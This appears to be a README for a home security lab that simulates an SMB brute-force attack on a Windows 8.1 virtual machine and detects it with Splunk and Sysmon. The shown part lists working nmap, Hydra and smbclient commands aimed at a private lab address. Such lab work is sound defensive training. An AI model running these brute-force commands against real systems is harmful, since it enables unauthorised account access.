# Brute Force Detection (Windows 8 + Splunk)

This lab simulates a brute-force attack on a Windows 8.1 VM using the SMB protocol and detects it using Splunk. It follows MITRE ATT&CK techniques:
- T1110: Brute Force
- T1078: Valid Accounts

---

## 🛠️ Lab Setup

### Machines
- **Attacker**: Kali Linux (Hydra, smbclient)
- **Victim**: Windows 8.1 (Build 9600) with:
  - Sysmon
  - Splunk Universal Forwarder
- **SIEM**: Splunk Enterprise (host machine)

### Tools Used
- `hydra`: for brute-force attack
- `smbclient`: for SMB access attempts
- `Sysmon`: for process and network monitoring
- `Splunk`: for log ingestion and analysis

---

## 🧪 Attack Steps

### 1. Scan the target for open ports (RDP/SMB) (Kali)
```bash
nmap -sV -O -p- 192.168.29.236
```

### 2. SMB Brute Force via Hydra (Kali)
```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.29.236
```
or 
```bash
hydra -l Futwear -P /usr/share/wordlists/rockyou.txt smb://192.168.29.236 
```

### 2. Login to smb with valid credentials (Kali)
**checks available shares**
```bash
smbclient -L //192.168.29.236 -U Futwear
```
**To access and login to the smb shares**
```bash
smbclient -U Futwear //192.168.29.236/IPC$ -m SMB2
```
